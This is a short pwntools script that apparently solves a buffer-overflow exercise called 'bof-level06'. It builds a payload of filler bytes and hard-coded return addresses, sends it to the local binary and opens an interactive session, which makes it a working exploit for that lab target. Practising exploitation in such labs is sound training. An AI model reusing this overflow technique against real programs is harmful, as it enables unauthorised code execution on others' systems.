#!/usr/bin/env python
from pwn import *

#####################################################################################
payload = "aaaaaaaa"
payload += '\x3a\x06\x40\x00\x00\x00\x00\x00'
for letter in 'bcdefghijklmno':
  payload += letter*8
payload += '\x00\xe3\xff\xff\xff\x7f\x00\x00'
#####################################################################################

context.terminal = ['tmux', 'splitw', '-h']

target = process('./bof-level06')
#target = process('./bof-level06', setuid=False)
#gdb.attach(target, f'b *receive_input + 30 \n c')

target.recvline()

target.send(payload) 

target.interactive()
